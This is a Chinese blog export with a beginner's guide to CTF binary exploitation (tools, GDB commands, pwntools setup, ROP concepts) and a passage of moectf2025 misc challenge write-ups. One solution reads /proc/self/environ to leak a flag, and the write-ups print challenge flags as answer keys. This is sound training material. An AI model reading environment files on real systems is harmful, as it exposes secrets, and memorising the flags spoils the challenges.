[{"content":"[TOC]\n前言：本文章有借鉴各大OJ、CTF平台等的资源图鉴，有部分内容相似，如有问题本人愿意下架整改，谢谢。\n欢迎来到PWN的世界 欢迎来到PWN的世界，这里遍地都是二进制寄存器和栈堆在陪伴着你😄\nPWN（读作“砰”，拟声词）一词起源于网络游戏社区，原本表示成功入侵了计算机系统，在CTF 中则是一种题目方向：通过构造恶意输入达到泄漏信息甚至劫持几乎整个系统（getshell）的目的。其实在 CTF 比赛发展初期，赛题通常只与二进制安全相关，因此PWN 是 CTF 领域最原始的方向。在这里，你能深入计算机系统最底层，感受纯粹的计算机科学，感受底层的计算机逻辑\u0026hellip;. $$ PWN =\u003e 逆向工程+漏洞挖掘+漏洞利用 =\u003e系统劫持 $$ 接下来，Expl0rer将和愿意入门PWN的同学一同学习，有问题随时在评论区及QQ交流讨论，In this article, I'll help you figure out what PWN is, why to learn it, and how to go about it.\n希望你能坚持下去。\n前置声明 我大一是CTF全栈😄，对其他方向也颇有了解，对我而言PWN的前置知识非常多，很多人选择等老师讲完课再去学，我认为这是一个很大的错误，老师只会带你去认识、入门这门课，对于你学PWN来说，所需的前置知识储备差距还是很大的，况且如汇编语言和计算机组成原理这些一般都在大二下学期、大三学习的，那时候已经晚了。既然你已经决定要学PWN了，所以我强烈建议要提前自学这些PWN前置知识。\n从开始入门PWN到拿到你的第一个专属flag还需要一段时间，但请耐心沉淀，你的付出一定会迎来回报！\n数据转换 在PWN的学习中，我们经常需要和如二进制、十六进制、寄存器等的这些底层数据打交道，因此PWN属于二进制（binary）安全，为什么要说是“二进制”？因为计算机只认识和只会处理二进制信息。与我们日常使用的十进制“逢十进一”不同，“逢二进一”的二进制世界只有“0”和“1”。一位二进制信息称为比特（bit），8 比特为 1 字节（byte），字节通常是计算机处理信息的最小单位，计算机中的信息通常是连续的字节。我们人类所输入给计算机的任何信息如文字、图像、音视频等都可被编码转换为数字信息（二进制比特流）进行处理，需要输出时再解码为原形式。\n不同进制间可相互转换，你需要熟悉进制转换方式，其中最重要的是二进制、十进制、十六进制间的转换。\n等你输入信息给计算机后，就轮到计算机本身去存储这个数据了，怎么存？为了方便数据类型转换和运算，计算机存储数字信息时，数字再内存中的高低位与人类阅读的高低位相反（从左到右、从上到下逐字阅读），这种数据存储方式称为“小端序存储”，当然你还需要知道大端序，这类知识其实归根于计算机基础中，在网上你可以搜索到这些相关资源，我在这并不多细分讲解，我只会列出方向给你去寻找并学习\u0026hellip;\n编程语言 既然PWN和逆向程序逻辑有关，我们还需要反推程序运行逻辑并得出“源代码”，此外我们应该先会正向写出一般的程序吧😄。刚入门的你可能懵懵的啥也不懂，那你需要去了解这些，对于PWN学习初期，我们一般面对的是Linux环境下的C语言，再者就是C++咯\n时代科技在不停更迭，人这一辈子都在不断学习，光停留在我以及其他大佬所讲述的“干货”是不够的，你需要学会“善用搜索引擎”（学会使用AI大模型），可以使用edge、谷歌、火狐等。\nC语言 C语言几乎是每一所高校的工科学生所学的第一门编程语言，C语言运行速度快，历史悠久，很多程序以及新生编程语言如C++都是基于C语言诞生的，大多数PWN题目的程序都由C语言编写，大多数逆向工具如IDApro的逆向出的语言都是类似C语言的伪代码\n你需要系统学习C语言，书籍推荐《C Primer Plus》（作者此前用过，好评！），当然学校统一买了其它教材也能凑合用，或者你可以上网找课程也可以如B站大学\n当前想速成的你可以去关注C语言中的基础数据类型（int、longlong、unsigned int\u0026hellip;）、流程控制（if、else、while、for\u0026hellip;）、函数（scanf、puts、gets、strcmp、system、execve、mmap\u0026hellip;）、指针、位操作。\nC 语言能很好地和汇编语言（详见下文“编译与汇编”）对应，学习两者时应相互结合，理解等效的 C 语句和汇编指令。\n等到我们PWN后期深入学习时，就需要额外学习C++甚至其他语言了，毕竟程序语言很多，可不止C和C++，甚至还有Java等等。\nPython Python专为PWN的exp编写而生：为了能编写漏洞利用脚本，你需要学习Python语言。Python语言极易上手，配置好Python环境后还需要安装pwntools等PWN所需的库。\n环境搭建 编程环境 说完上面的语言介绍，我们需要配置一些编程环境，这里我推荐是Pycharm和Visual Studio Code，vscode安装在虚拟机上，然后Pycharm和vscode可以安装在主机上，方便你后续学习编程语言。\n虚拟机配置 Linux是一种开源的Unix操作系统，因其性能功耗低等的优势如今被常用于服务器，但我们日常使用的PC操作系统是Windows系统。为了和题目所在的编译环境兼容少出bug以及避免环境污染主机（CTF工具很多，放在主机不太好），我们需要配置一台Linux系统的虚拟机，这里推荐安装Ubuntu虚拟机（当然之前有配置好Kali也勉强可以）或使用docker，网上教程很多，自行寻找。\nPWN环境搭建 安装好Linux环境后，还需要继续搭建配置PWN的环境，这里有一篇文章值得你去读：\nEnvironment - CTF Wiki 也可以看看CSDN上的歪插YX大佬的博客文章：\n★pwn 22.04环境搭建保姆级教程★_pwn环境搭建 总之你至少需要：\nLinux的Python环境+pwntools 逆向分析工具如IDA Linux的动态调试器如GDB+pwndbg checksec、one_gadget、seccomp-tools、LibcSearcher、ropper 一个PWN的标准解题思路大概是：\n用checksec 检查保护机制（详见可以看我的文章：PWN-1_Linux保护机制） 用逆向分析工具（如IDA）反汇编编译挖掘漏洞 使用GDB+pwndbg调试确认漏洞细节 用Python+pwntools编写利用脚本 libc 和 ld 分别是 Linux C 标准库和动态链接器。我们用 C 语言编写程序时经常调用一些“从天而降”的函数（printf、scanf\u0026hellip;），它们其实就在 libc（通常为 GNU 提供的glibc）里，ld 则搭起你的程序和这些函数间的“桥梁”。Linux 系统中几乎所有软件都需要用到它们！\nLinux操作 既然PWN需要在Linux-Ubuntu中操作，那么在解题过程难免会使用Linux的一些操作指令，那么你应该直到cd、ls、chmod、file、cat、grep、strings等基础指令以及管道、重定向概念，在此期间你会接触到计算机组成原理的部分知识，详见可以看看我的文章PWN-1\n在计算机领域，“shell”是一种计算机程序，它将操作系统的服务提供给人类用户或其他程序，在 Linux 中通常指命令行界面。\n对于 PWN，一个很重要且必要的命令行工具是Netcat（nc 命令），它能用来连接 Pwn 题目的在线环境。Netcat 是一个强大的多功能网络工具，目前你只需要知道一种用法：nc \u0026lt;ip\u0026gt; [端口]\n到这里你已经初步了解并接触PWN了，你还需要直到一些Linux常用的系统调用（syscall）——open、read、write、mmap、execve等和文件描述符fd（file descriptor）的概念：stdin-0、stdout-1\u0026hellip;，此外你需要知道Linux程序运行所经历的过程（动态链接、got、got.plt表的调用，栈堆变化等等）。\n我要晕了/(ㄒoㄒ)/~~\u0026hellip;.看看我的文章PWN-1，我总结了一些。\n编译 看到这里累死了，你或许会能看懂C语言了，但不止于此哦，我们必须要熟悉程序编译过程和基本的汇编语句，就是说我们需要学习汇编语言。你需要了解ELF文件格式，了解预处理-\u0026gt;编译-\u0026gt;汇编-\u0026gt;链接（静态or动态）的过程、进程虚拟内存空间（栈、BSS段、数据段、代码段TEXT、data段、rodata等等）。理解调用栈结构及其增长方向与数据存储增长方向相反是PWN前期学习的一大重点。\n汇编 对于汇编语句，平时的PWN程序一般是x86 CPU指令集（本文默认amd64位），32位和64位的汇编语言还是有差别的，但大致相同，至少要看懂mov、lea、add、sub、xor、call、ret、jmp、cmp、pop、nop、push等，这是一大难点哦。\n另外一大难点就是CPU寄存器，认识下64位的rsp、rip、rbp、rax这些，以及32位的esp、ebp、eip等。重点认识有特殊用途的寄存器。\n在做 Pwn 题时，有时你需要先在适当位置填入 shellcode（用于获取 shell 的汇编码）再劫持控制流（详见下文）至此处以执行。你需要知道计算机在汇编层面是如何调用函数的。具体而言，你需要知道并牢记 amd64 System V ABI 函数调用规约：调用函数时的部分参数通过寄存器（rdi、rsi、rdx、rcx、r8、r9）传递其余通过栈传递，32 位系统直接通过栈传递参数（从右至左入栈）；函数返回值也由寄存器（rax）传递。除了函数调用，你还需要知道 syscall 的系统调用号与参数的传递方式（rax\u0026hellip;），这与函数调用类似。（总之：善用搜索引擎）\n学习路线 初步了解完PWN了，要开始了吗？前者知识可以看看我的文章—PWN 前置知识 - Expl0rer.Ct，最好边学边做。学习PWN一定不能一直看书，这样思维会固化，需要随时应用，学一个知识点做一道题，光看完所有知识只会让你望而却步，反而会被庞大的前置知识劝退、打击自信心，学习重在反馈，这样才会有继续学习下去的动力，我的建议是多看师傅们博客的文章和writeup（赛后复盘），多做题，不懂就去查询或者问虚心请教师傅（行业通称）。\n建议看在线资源或者博客文章，书籍信息一般具有滞后性，当然也不反对看各大战队出版的具有总结性的书籍。\n作者也是厚脸皮去找大佬请教的，\n基本上来看，入门PWN大致是配置好环境就开始学习编程语言——C、Python，了解并学会使用反汇编器如IDA，接着进一步能看懂C伪代码，然后学习汇编语言，熟练使用Linux命令行操作命令，接下来学习PWN的前置知识，可以参考我的文章PWN 前置知识 - Expl0rer.Ct中的PWN-1、PWN-2、PWN-3、PWN-4等（正在更新ing\u0026hellip;）。边学边刷题，我这里以ctfshow-PWN入门这套题为例（付费），buuctf也行，还有很多刷题网站，可以了解我的博客技术链接 | Links\nIDA使用 常用的快捷键有以下：\ng跳转到指定地址。 a将数据转换成字符串。 shift+F12打开字符串窗口，可以找出所有字符串。 ctrl+w保存IDA数据库，保留你当前的工作痕迹，下次打开时就从当前进度继续逆向基础上继续啦。 n更改变量名，方便记名和识别关键函数。 /在伪代码界面下写下注释。 更多IDA快捷键可以了解IDA 使用指南。\nGDB+pwndbg 随着PWN的进阶，不能局限于IDA静态分析程序了，接下来就是调试了，调试能更好帮助我们了解这个程序的执行流程，那我们需要必备的gdb调试器，它能动态地帮助我们了解当前程序运行的细节（如真实的缓冲区大小、寄存器地址等）\nstart GDB会寻找程序的入口并下断点，然后执行到该断点。\nrun 简写为r，运行程序，与start的区别是，run 之后将一直执行到程序的结束或者断点，通过 run abc，可以以 abc 为参数运行。\nnext 简写为 n，源代码级别的调试，运行下一行代码。\nnexti 简写为 ni，汇编指令级别的调试，运行下一个指令。\nstep 简写为 s，下一行代码，当遇到函数的时候会步入函数。\nstepi 简写为 si，下一行指令，当遇到函数的时候会步入函数。\ninfo register 简写为 i r，查看当前寄存器信息。\ndisassemble 简写为 disass，反汇编所给地址或寄存器中所给地址处的指令如disass $rip，查看当前 rip 处的指令，disass 0x40112b，查看地址 0x40112b 处的指令。\nbreak 简写为 b，下断点，可以通过 info b 查看当前下的所有断点，以及通过 b*$rebase(\u0026lt;offset\u0026gt;) 通过相对程序基址的偏移下断点（当找不到入口信息，无法start 的时候，常通过这个进行下断点）\nvmmap 查看程序的地址映射\nchecksec pwndbg 中集成了 pwntools 的一些命令，checksec 就是其中一个，查看可执行文件的保护机制。\ncyclic 同样是 pwntools 的一个命令，能产生不重复的模式字符串，常用于确定栈偏移，如 cyclic 15 能产生“aaaaaaaabaaaaaa”。\nquit 简写为 q，退出当前调试。\ncrtl + c 中断被调试的程序，举个例子，比如当前程序跑到了 read，阻塞在了接收输出的时候，此时可以通过 crtl + c 中断程序的运行，此时你可以查看程序中断时的寄存器、栈、内存、调用栈等状态。\nTAB 进行命令的补全。\naslr on/off 开启或者关闭 ASLR（见下文），下一次运生效。\nstack 查看当前栈的信息。\nx 通过x/i打印指令，x/s 打印字符串，x/x 打印十六进制数等。这个的参数比较多，建议自行查阅资料来了解。\ntele 是 pwntools 提供的一个命令，可以自动解析该地址处的内容及引用，但是它解释指令的时候不一定正确，反汇编指令仍推荐 x/i。\nPwntools 看到这里你配置好pwntools了吗？这是一个强大的Python库，它能够进行自动程序交互，有sendline、recvuntil、remote、connect等函数代替我们和程序进行交互（尤其在无法用键盘正常输入不可见字符以及”二进制“信息时，优势显现）。我推荐你学习一下 pwn college 中的pwntools模块\n这里给大家看看pwntools结合pwndbg如何进行调试，在脚本中指定用context。\n64位：\n1 2 from pwn import * context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) 32位：\n1 2 from pwn import * context(arch = \u0026#39;i386\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) 之后需要指定终端，这个设置告诉 pwntools 启动一个 新终端窗口/tab/pane 来运行 GDB，而以下是几种常见的终端。（选用）\n1 2 3 4 5 6 #wsl context.terminal=[\u0026#39;wt.exe\u0026#39;,\u0026#39;wsl\u0026#39;] #tmux context.terminal=[\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] #konsole context.terminal = [\u0026#39;konsole\u0026#39;, \u0026#39;-e\u0026#39;] 总之pwntools很大，慢慢学！\n在编写exp难免需要一边调试一边修改，就需要用gdb调试，在脚本中通过 gdb.debug() 或者gdb.attach(\u0026lt;process\u0026gt;) 启动 gdb，两者的区别是，前者是从头启动程序，并自动 attach 到 GDB，而后者是attach 到已有进程进行调试，需要在 attach 之前通过process(\u0026lt;path\u0026gt;) 启动程序。\n当你成功入门PWN并能学会独立编写exp时再看到这里，我想说recv()和send(...)很方便，但我强烈建议使用recvuntil(\u0026hellip;)和sendafter(\u0026hellip;)或者sendlineafter(\u0026hellip;)，就是为了exp的严谨和衔接性，以免各种本地和远程环境不符的情况。sendafter、sendlineafter等这类函数的首个接收参数的(\u0026ldquo;接收的字符\u0026rdquo;,payload)，接受的字符不宜过长，也别忘了\\n，pwntools库函数的参数和返回值类型通常为 bytes，传入字符串字面量时应在前加上 b 标记（例如 b\u0026rsquo;I am Expl0rer!!\u0026rsquo; ），使其成为 bytes（python2不会强调要求，python3会强调要求且有可能报错）\n互联网时代的到来 当前，AI赋能时代，AI几乎无所不能了，我们的父辈都需要通过图书馆查阅相关书籍，现在的我们只需要通过搜索引擎或者AI检索，技术存在壁垒这是铁一般的事实，AI的崛起，让你身边有了许许多多的百科全书式的虚拟老师，如DeepSeek、豆包、ChatGPT，虽然AI大模型在当前仍有一些缺陷不是什么情况都是百分百给出正确的答案，但是对于大多数的问题，ta都能给出一个正确的答案还有分析过程，善用AI能够帮助你快速的学习和补漏，但不是让你完全依赖AI，ta只是一个辅助工具，自己动手才会进步！\n请记住，如果AI没用好就会成为一把剑🗡反噬你，但是你能用好AI那ta就是一把能帮你斩下险阻的最锋利的🗡！\n普遍漏洞利用 整数溢出——数学世界整数有无穷多，但由于内存限制，计算机中补码表示的“整数”有上下限。通过输入超大数字溢出或者利用有符号整数（负数）强转为无符号整数可以构造超大数字，从而绕过检查或越界写入。\n栈缓冲区溢出——最经典的漏洞，通过越界写入修改函数返回地址或栈指针从而实现劫持控制流和栈迁移（篡改栈基址 rbp/ebp）\nROP（返回导向编程）攻击链构造——这是PWN的一个需要重点突破的攻击手法，也就是ret2xxxx：ret2text、ret2libc、ret2syscall、ret2system、ret2、ret2shellcode、ret2csu、SROP等，这也是栈缓冲区溢出的主要目的。\n进阶：通过ropper、ROPgadget等工具寻找该pwn程序中gadgtes，结合溢出漏洞去构造调用链控制程序执行流甚至能执行几乎任何行为（通常open、read、write）。\nLinux安全机制 我们需要熟悉这些保护机制的原理以及性质作用：\nNX（No execute）——无法简单地布置shellcode。 Canary（金丝雀）——检查缓冲区是否溢出，如有溢出立刻终止程序运行。 ASLR/PIE——地址随机化保护，使攻击者难以预测程序的内存结构，增加攻击难度。 RELRO——通过将动态链接程序的全局偏移量表（GOT）在程序启动后设置为只读，防止通过修改其中数据结构进行攻击。 Seccomp——沙箱保护机制，可以限制程序使用的syscall。 CFI（IBT / SHSTK）—— 控制流完整性保护，可以阻止 ROP 攻击，抑制 COP、JOP 攻击。 知识输出 PWN是一个庞大的方向，对于枯燥的寄存器、gadgte、栈堆漏洞利用、内核kernel等等都是一个个难啃的硬骨头，俗话说基础不牢，地动山摇，我们需要时常巩固自己的知识体系，WP是有必要写的，复盘自己的学习情况，再用自己的描述去表达出来记录在WP中，当然可以学作者这样开个博客，把这些文章放上去，给别人看，达成互相技术交流，别人请教你的同时不仅提升了自己的自信心，还进行了知识输出巩固了自己的知识理解。\n写博客和WP我建议用Markdown，它是一种轻量级标记语言，用于编写格式简单、易读，我们在学习中通常需要保留学习痕迹或者记录笔记，最重要的，编写 Writeup 通常也采用 Markdown，因此这里推荐使用一些 Markdown 编辑器进行编写，如 Typora 和 Notion 等，上手之后非常方便。\n总结 感谢你读到这里，PWN真是一个很难入门的方向，冗长的前置知识，漫长的打地基过程，光是前置知识就够劝退很多同学啦，等你逐步入门了并学到中阶PWN，这时以后的方向学习就靠你了，可以是Iot、物联网安全、车联网1安全、工控等等都和PWN二进制安全相关的，但以后你可能还要学习CTF的RE逆向方向，毕竟： $$ PWN =\u003e 逆向工程+漏洞挖掘+漏洞利用 =\u003e系统劫持 $$ 逆向知识还是需要的，只不过当前阶段重在漏洞利用挖掘这方面，当你打爆靶机的那一刻，整个世界都是属于你！❀😄\n我们的努力都不会白费，历尽千帆，我们终将顶峰相见！至此致敬一路上带我入门、一起相互交流的UU和学长学姐😘\n我的博客有很多资源，入门PWN的知识体系我总结的七七八八了，您要不嫌弃可以去看看，感兴趣可以一起来交流吧！\n本文借鉴参考了XDCTF-PWN的入门指南文章及各大CTFwiki\n作者：Expl0rer.Ct\n时间：2025.11.07\n","date":"2025-11-07T00:00:00Z","headings":[{"id":"欢迎来到pwn的世界","level":2,"text":"欢迎来到PWN的世界\n"},{"id":"前置声明","level":2,"text":"前置声明\n"},{"id":"数据转换","level":2,"text":"数据转换\n"},{"id":"编程语言","level":2,"text":"编程语言\n"},{"id":"环境搭建","level":2,"text":"环境搭建\n"},{"id":"linux操作","level":2,"text":"Linux操作\n"},{"id":"学习路线","level":2,"text":"学习路线\n"},{"id":"ida使用","level":2,"text":"IDA使用\n"},{"id":"gdbpwndbg","level":2,"text":"GDB+pwndbg\n"},{"id":"pwntools","level":2,"text":"Pwntools\n"},{"id":"互联网时代的到来","level":2,"text":"互联网时代的到来\n"},{"id":"普遍漏洞利用","level":2,"text":"普遍漏洞利用\n"},{"id":"linux安全机制","level":2,"text":"Linux安全机制\n"},{"id":"知识输出","level":2,"text":"知识输出\n"},{"id":"总结","level":2,"text":"总结\n"},{"id":"c语言","level":3,"text":"C语言\n"},{"id":"python","level":3,"text":"Python\n"},{"id":"编程环境","level":3,"text":"编程环境\n"},{"id":"虚拟机配置","level":3,"text":"虚拟机配置\n"},{"id":"pwn环境搭建","level":3,"text":"PWN环境搭建\n"},{"id":"编译","level":3,"text":"编译\n"},{"id":"汇编","level":3,"text":"汇编\n"}],"image":"https://expl0rer.top/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/PWN%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97_hu_51c01c9c1271699d.png","permalink":"https://expl0rer.top/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/","title":"给PWN新手的溢出魔法入门手册"},{"content":"前言：等了好久终于来更新了moectf2025的WP了，欢迎师傅来交流\n西电 CTF 终端\n[TOC]\n安全杂项 miscru_men_zhi_bei_.pdf\n2048_master 大家都是2048高手吧，出题人准备了一点小礼物哦，玩玩游戏就能拿到flag^_^\n一个简易的win32界面的2048小游戏，键盘上下左右移动：\n打开文件运行游戏，随便乱按“上下左右”键，运行完会发现桌面多出了一个文件，里面这是个布局。每格的数字代表了2的多少次方，最下面是分数。\nmoectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu}\nMisc入门指北 这题我直接引用官方WP的图片\n全局搜索flag\nmoectf{We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!}\nPyjail 0 A simple reader (所以严格来说这题不算 Pyjail)\n你可以使用 netcat 或 pwntools（参考二进制漏洞审计入门指北）连接到本题和后续 Pyjail 题的环境。\n关于验证码，示例：Please enter the reverse of \u0026lsquo;GZUUAOIS\u0026rsquo; to continue: SIOAUUZG\n至于 flag 的位置？你可以参考 Web 第十二章（\n根据题⽬描述flag位置参考web⼗⼆章，读取环境变量/proc/self/environ，这题我是请教Web手的，触及我的知识盲区了\u0026hellip;\nnc连接好后，输入/proc/self/environ给它就会吐flag了。\nRush “冲刺，冲刺！”你正走在路上，耳边传来这样的声音，还没反应过来，就被撞倒了。\n你费劲地爬起来，好像看到了什么信息，回过神来那人早已扬长而去，那我缺的这个道歉这块？\n上述文案纯属看图说话，玩个梗，无恶意\n硬着头皮用手机扫也行（你手机能扫到就好），当然手机扫不了就抽帧来扫，工具很多，我这里用puzzlesolver：\n用QR_research工具去扫码：\nmoectf{QR_C0d3s_feATUR3_eRror_c0RRECt10N}\nez_LSB 这是一张普通的图片，但是一个个像素看过去似乎有些蹊跷？\n看题目就知道，这应该是LSB隐写，用stegsolve分析看看：\n这里有一些不规则的色条，应该是非法插入字符串导致排布不一，过滤Red 0通道\nbW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9\n用Cyberchef进行base64解码：\nmoectf{LSB_1s_s0_1nt3rest1ng!!sj9wd}\nez_锟斤拷???? E=hv在记事本里写下了一些神秘字符，但是经过一通保存另存为的迷之操作之后文本文件里的东西全变成了乱码\n现在我把这个文件给你，请你帮助hv找回文件的秘密吧！\n请把得到的flag转换成半角字符上交\nhint：此题解法与锟斤拷有关\n里面的txt内容：\n1 锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹 叫AI帮我解决：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 def fix_encoding_mismatch(garbled_text): \u0026#34;\u0026#34;\u0026#34; 修复UTF-8与GBK编码不匹配导致的乱码 原理：乱码是\u0026#34;UTF-8文本→误GBK解码→再UTF-8保存\u0026#34;的结果，反向执行即可还原 \u0026#34;\u0026#34;\u0026#34; try: # 1. 将乱码文本按GBK编码为字节流（还原错误解码前的原始字节） gbk_bytes = garbled_text.encode(\u0026#39;gbk\u0026#39;, errors=\u0026#39;ignore\u0026#39;) # 2. 将字节流按UTF-8解码（得到原始正确文本） original_text = gbk_bytes.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;) return original_text except Exception as e: return f\u0026#34;解码失败：{str(e)}\u0026#34; # 你提供的乱码内容 garbled_content = \u0026#34;锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹\u0026#34; # 执行解码 original_flag = fix_encoding_mismatch(garbled_content) # 输出结果（过滤无关字符，提取flag） # 从还原结果中提取flag格式内容（通常为flag{...}） import re flag_match = re.search(r\u0026#39;flag\\{.*?\\}\u0026#39;, original_flag) if flag_match: final_flag = flag_match.group() print(\u0026#34;还原成功！半角flag为：\u0026#34;) print(final_flag) else: print(\u0026#34;还原后的原始文本：\u0026#34;) print(original_flag) print(\u0026#34;\\n未匹配到flag格式，可手动查看上述文本中的flag\u0026#34;) 1 ｍｏｅｃｔｆ｛ＥｎＣ０ｄ１ｉｎｇ＿ｇｂＫ＿＠ｎＤ＿Ｕｔｆ＿８＿１ｓ＿４ｕｎ！！ｅｗｗｗｗ｝恭喜你得到弗拉格后面全昔斤拷锟斤拷锟斤拷 再转换成半角字符：moectf{EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww}\nweird_photo FLAG就在图中。\n什么，你说你看不见 FLAG？注意 CRC！\n直接丢进随波逐流就梭出来了，当然不嫌麻烦可以用010editor去拉⾼图⽚\nmoectf{Image_Height_Restored}\nSSTV 识别并解码附件中使用的特殊通信协议，以获取隐藏信息。\n搜索“SSTV解码”Online SSTV Decoder - Decode Slow Scan Television Audio to Images看看：\nmoectf{d3codiNG_SStV_reQu1REs-PATI3nC3}\nencrypted_pdf 这年头，啥都能带个密码，pdf也不例外。\n难道有密码就能拦住我堂堂misc手吗？？不可能的！\n密码是qwe123，着我乱输几次就可以了。\n接下来就是全局搜索：\n最后在图片后面找到flag：\nmoectf{Pdf_1s_r3a1ly_c0lor4ul!!ihdw}\n哈基米难没露躲 出题人哈基米音乐听多了(bushi\n1 南北绿豆奈哪买噶奈哪买南北绿豆；欧莫季里噶奈哪买噶奈哦吗吉利。哦吗吉利哪买噶奈哪椰奶龙？哈基米买娜奈哪买北窝那没撸多。哈基米多多压那奈椰奶龙；奈诺娜美嘎哪买娜奈哪买窝那没撸多？哦吗吉利噶奈哪买哈基米；窝那没撸多噶奈哪买噶奈哪哈基米。库路曼波买噶奈哪买哦吗吉利，哈基米娜奈哪买北南北绿豆，哦吗吉利多多压那多多欧莫季里。阿西噶压压那南撸基阿奈诺娜美嘎，哈基米南里南北友里窝那没撸多。库路曼波一吉豆没咕椰奶龙，库路曼波吉豆没咕吉豆椰奶龙。库路曼波没咕吉豆没咕库路曼波？哦吗吉利吉豆没米吉库路曼波。阿西噶压豆耶咕吉豆没米窝那没撸多；南北绿豆吉豆没米哈基米；窝那没撸多吉豆没咕吉奈诺娜美嘎。库路曼波豆没咕吉豆椰奶龙，欧莫季里没咕吉豆没咕吉南北绿豆？库路曼波豆没米吉豆欧莫季里。哦吗吉利耶咕吉豆没咕奶哈基米；窝那没撸多压多那吉豆没咕奈诺娜美嘎。阿西噶压吉豆没咕吉哦吗吉利；椰奶龙豆没咕吉豆没咕南北绿豆。窝那没撸多吉豆没米奶压哈基米，哈基米多那吉豆没米吉哈基米？奈诺娜美嘎豆没咕吉豆窝那没撸多，南北绿豆没咕吉豆没咕吉窝那没撸多，窝那没撸多豆没咕吉哦吗吉利；南北绿豆豆没咕吉豆没米窝那没撸多；南北绿豆吉豆耶咕吉豆椰奶龙。哈基米没米吉豆哈基米？库路曼波耶吗多奈哪买噶哈基米。哦吗吉利奈哪买噶奈哪阿西噶压；南北绿豆买噶奈哪窝那没撸多；阿西噶压买噶奈哪买阿西噶压；哈基米娜多多压那窝那没撸多？欧莫季里奈哪买北多奈诺娜美嘎；哦吗吉利多压那呀里欧西库路曼波。窝那没撸多奈哪买噶奈哈基米；南北绿豆哪买噶奈哪哦吗吉利，欧莫季里买噶奈哪买噶奈库路曼波，库路曼波哪买噶多多压那库路曼波。哈基米奈哪买噶奈哪买南北绿豆？椰奶龙娜奈哪买哈基米，窝那没撸多噶奈哪买奈诺娜美嘎？阿西噶压噶奈哪买噶奈哪哈基米，阿西噶压买噶奈哪买娜奈奈诺娜美嘎。奈诺娜美嘎哪买北奈哪买噶椰奶龙？哦吗吉利奈哪买北奈诺娜美嘎，窝那没撸多奈哪买噶奈哪窝那没撸多？阿西噶压买噶奈哪买噶奈欧莫季里。库路曼波哪买噶奈哈基米？阿西噶压哪买噶多多压那阿西噶压。窝那没撸多奈哪买北奈哪买阿西噶压；库路曼波噶奈哪买噶窝那没撸多。南北绿豆奈哪买噶奈哈基米；椰奶龙哪买噶奈哪买哦吗吉利；南北绿豆噶奈哪买哈基米；哈基米噶多多压那奈诺娜美嘎？窝那没撸多奈哪买北奈哦吗吉利，库路曼波哪买娜奈椰奶龙。哈基米哪买噶奈哪欧莫季里？椰奶龙买噶奈哪买噶阿西噶压。哈基米奈哪买噶奈奈诺娜美嘎？欧莫季里哪买噶多多压那哦吗吉利，阿西噶压奈哪买娜奈哪买哦吗吉利，南北绿豆娜奈哪买噶奈哪哈基米；库路曼波买噶奈哪买窝那没撸多。哈基米噶奈哪买南北绿豆；椰奶龙噶奈哪买噶多多窝那没撸多，阿西噶压压那奈哪买椰奶龙，欧莫季里娜奈哪买奈诺娜美嘎，阿西噶压北奈哪买噶奈哪库路曼波。库路曼波买噶奈哪买噶奈阿西噶压？哈基米哪买噶奈南北绿豆，南北绿豆哪买娜奈哪买哈基米；哦吗吉利北奈哪买噶奈椰奶龙，库路曼波哪买北奈窝那没撸多，阿西噶压哪买噶奈哪买奈诺娜美嘎；奈诺娜美嘎噶奈哪买噶奈欧莫季里，阿西噶压哪买噶奈哪窝那没撸多。南北绿豆买噶多多阿西噶压，窝那没撸多压那奈哪阿西噶压？椰奶龙买北奈哪奈诺娜美嘎；窝那没撸多买娜奈哪买噶奈椰奶龙？哦吗吉利哪买噶奈阿西噶压。哈基米哪买噶奈哪窝那没撸多；库路曼波买噶奈哪买噶奈欧莫季里。南北绿豆哪买北多多压那窝那没撸多；欧莫季里奈哪买娜奈哪买奈诺娜美嘎；椰奶龙噶奈哪买噶窝那没撸多，奈诺娜美嘎奈哪买噶奈阿西噶压；阿西噶压哪买噶奈哪买娜阿西噶压；椰奶龙奈哪买北奈欧莫季里。奈诺娜美嘎哪买噶奈阿西噶压，椰奶龙哪买娜奈哪买欧莫季里？库路曼波噶奈哪买库路曼波。阿西噶压噶奈哪买噶窝那没撸多；窝那没撸多奈哪买噶奈哪买南北绿豆？阿西噶压噶多多压那椰奶龙，库路曼波奈哪买娜哈基米；窝那没撸多奈哪买噶阿西噶压，库路曼波喔酷娜利步啊那窝那没撸多？南北绿豆吉豆没咕吉豆欧莫季里；欧莫季里没咕吉豆没南北绿豆？库路曼波咕吉豆没咕库路曼波。哈基米吉豆没咕哦吗吉利？哈基米奶压多那吉豆库路曼波，库路曼波没咕吉豆耶咕阿西噶压，椰奶龙吉豆没咕吉豆没窝那没